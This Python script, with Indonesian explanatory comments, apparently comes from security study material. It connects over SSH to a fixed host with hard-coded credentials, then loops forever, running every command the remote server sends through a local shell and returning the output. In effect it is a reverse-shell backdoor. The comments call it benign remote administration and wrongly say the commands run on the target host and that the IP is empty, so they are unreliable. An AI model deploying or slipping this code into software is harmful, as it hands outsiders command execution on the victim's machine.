import subprocess
import paramiko

# import modul : Program menggunakan modul subprocess untuk menjalankan perintah pada sistem operasi lokal dan modul paramiko untuk mengatur koneksi SSH ke host tujuan.

def ssh_command(ip, user, passwd, command):  # fuungsi "ssh_command" : Fungsi ini menerima empat parameter: ip (alamat IP host yang akan dihubungi), user (nama pengguna SSH), passwd (kata sandi SSH), dan command (perintah yang akan dijalankan di host).
    client = paramiko.SSHClient() 
    # client can also support using key files
    # client.load_host_keys('/home/user/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)
    # inisialisasi klaien ssh: Membuat objek klien SSH, mengatur kebijakan penanganan kunci host yang hilang, dan melakukan koneksi ke host dengan alamat IP, nama pengguna, dan kata sandi yang diberikan. 
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))  # read banner
       
       # memebuka sesi ssh : Membuka sesi SSH setelah koneksi berhasil. Jika sesi SSH aktif, mengirimkan perintah ke host dan mencetak output dari perintah tersebut (biasanya banner).
        while True:
            # get the command from the SSH server
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command.decode(), shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(str(e))
    client.close()
    return

# loop penerimaan eksekusi perintah : Program masuk ke dalam loop tak terbatas untuk menerima perintah dari server SSH. Kemudian, program menjalankan perintah menggunakan subprocess.check_output dan mengirimkan outputnya kembali ke server.

ssh_command('192.168.100.130', 'justin', 'lovesthepython', 'ClientConnected')

# pemanggilan fungsii : Memanggil fungsi ssh_command dengan parameter yang sesuai: alamat IP kosong (seharusnya diisi dengan alamat IP tujuan), nama pengguna 'justin', kata sandi 'lovesthepython', dan perintah 'ClientConnected' yang akan dijalankan di host.
# ---------------------------------------------------------------------------------------------------------------------------- # 
# Program Python di atas menggunakan modul Paramiko dan Subprocess untuk menjalankan perintah melalui koneksi SSH.

# Manfaat:
# Program ini berguna untuk menjalankan perintah pada host tujuan melalui koneksi SSH. Ini dapat digunakan untuk otomatisasi atau remote administration pada sistem yang mendukung protokol SSH.

# Catatan:
# Program ini memiliki kelemahan yang mirip dengan program sebelumnya, seperti tidak ada penanganan error yang memadai dan risiko keamanan penggunaan kata sandi.
# Penggunaan loop tak terbatas (while True) dapat menyebabkan program menjadi blokir dan tidak responsif jika tidak ada perintah yang dikirimkan dari server SSH. Sebaiknya, tambahkan kondisi untuk menghentikan loop jika diperlukan.
